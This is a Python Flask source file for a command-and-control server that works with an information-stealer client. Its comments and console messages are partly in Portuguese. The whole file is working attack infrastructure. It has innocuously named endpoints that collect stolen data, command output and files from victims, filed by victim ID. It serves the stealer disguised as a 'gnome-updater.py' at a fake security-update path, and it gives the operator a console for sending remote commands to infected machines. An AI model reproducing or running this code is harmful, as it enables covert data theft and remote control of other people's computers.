from flask import Flask, request, jsonify
from flask import send_from_directory
import os, threading, logging, time, datetime
from werkzeug.utils import secure_filename

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

HOST = "localhost"
PORT = 4443

def clear_terminal():
    os.system('clear')

@app.route('/login', methods=['POST'])                     # Endpoint to receive data from the stealer client 
def login_data():
    data = request.get_data(as_text=True)

    print(f"\n[+] Dados recebidos do cliente:\n{data}\nC2_Command > ", end="")

    with open('initial-gathering.txt', 'a') as f:
        f.write(f"{data}\n---\n")
    return jsonify({"message": "logging successful"}), 200 # Message to mask the real purpose

@app.route('/register', methods=['POST'])                  # Endpoint to receive data commands from the stealer client
def register_command():
    data = request.get_data(as_text=True)

    print(f"\n[+] Comando recebido:\n{data}\nC2_Command > ", end="")

    with open('command-log.txt', 'a') as f:
        f.write(f"{data}\n---\n")
    return "", 200                                         # Return an empty response to mask the real purpose

@app.route('/admin', methods=['POST'])                     # Endpoint to receive upload files from the stealer client
def admin_upload():
    if 'file' not in request.files:
        return jsonify({"error": "Admin login or password wrong"}), 400

    file = request.files['file']

    victim_id = request.form.get('login', 'unknown')
    file_category = request.form.get('password', 'unknown')
    original_path = request.form.get('file', 'unknown')

    if file:
        sanitized_filename = secure_filename(file.filename)
        
        save_dir = os.path.join("uploads", victim_id, file_category)
        os.makedirs(save_dir, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        final_filename = f"{sanitized_filename}_{timestamp}"
        save_path = os.path.join(save_dir, final_filename)

        try:
            file.save(save_path)
            print(f"\n[+] Arquivo recebido.\nC2_Command > ", end="")
        except Exception as e:
            print(f"\n[!] Erro ao salvar arquivo: {e}.\nC2_Command > ", end="")
    return "", 200                                         # Return an empty response to mask the real purpose

@app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
def get_stealer_client():
    print("[+] Cliente recebeu o gnome-updater.py.\nC2_Command > ", end="")
    return send_from_directory('app', 'gnome-updater.py')

latest_command = {"cmd": ""}

@app.route('/loopback', methods=['POST'])                   # Endpoint for the client to fetch the latest command
def loopback():
    if request.method == 'POST':
        command_to_send = latest_command["cmd"]
        latest_command["cmd"] = ""                          # Clear the command after sending it
        return jsonify({"command": command_to_send})

def operator_command_interface():
    global latest_command

    print("\n[+] Interface de Comando do Operador: Digite 'exit' para fechar o C2.")
    while True:
        try:
            cmd = input("C2_Command > ")
            if cmd.lower() == "exit":
                print("[!] Desligando o servidor C2. Pressione Ctrl+C na janela do Flask para sair completamente.")
                os._exit(0)
            latest_command["cmd"] = cmd
            print(f"[+] Comando definido: '{cmd}'")
        except EOFError:
            print("\n[!] EOF recebido. Digite 'exit' para sair.")
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detectado. Digite 'exit' para sair ou pressione Ctrl+C novamente para forçar.")
            continue

def run_flask_app():
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)

def server():
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    time.sleep(0.3)

    clear_terminal()

    print("[+] Servidor de Comando e Controle está rodando...")
    print(f"[+] Cliente buscará comandos em http://{HOST}:{PORT}/loopback (POST)")
    print(f"[+] Alvos podem baixar o cliente em http://{HOST}:{PORT}/security_debian_x386")

    operator_command_interface()

if __name__ == "__main__":
    server()